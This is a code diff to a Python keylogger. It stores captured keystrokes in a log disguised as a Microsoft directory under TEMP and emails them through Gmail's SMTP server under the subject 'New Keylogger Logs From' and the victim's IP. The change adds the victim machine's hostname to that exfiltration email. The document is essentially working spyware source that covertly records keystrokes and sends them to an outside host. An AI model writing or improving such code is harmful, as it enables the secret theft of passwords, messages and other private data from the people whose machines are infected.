@@ -40,6 +40,7 @@ blnMelt = "False"
 # variables/constants
 TMP = os.environ["TEMP"]
 APPDATA = os.environ["APPDATA"]
+strHostname = os.environ["computername"]
 cPuffDir = TMP + "/microsoft_data_dir"
 strLogPath = cPuffDir + "/microsoft_log.txt"
 blnFirstSend = "True"
@@ -152,7 +153,7 @@ def OnKeyboardEvent(event):
             else:
                 strMessage += strLogs
 
-            strEmail = "Subject: {}\n\n{}".format("New Keylogger Logs From " + strExIP, strMessage)
+            strEmail = "Subject: {}\n\n{}".format("New Keylogger Logs From " + strExIP + " " + strHostname, strMessage)
 
             SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
             SmtpServer.ehlo()   # identifies you to the smtp server
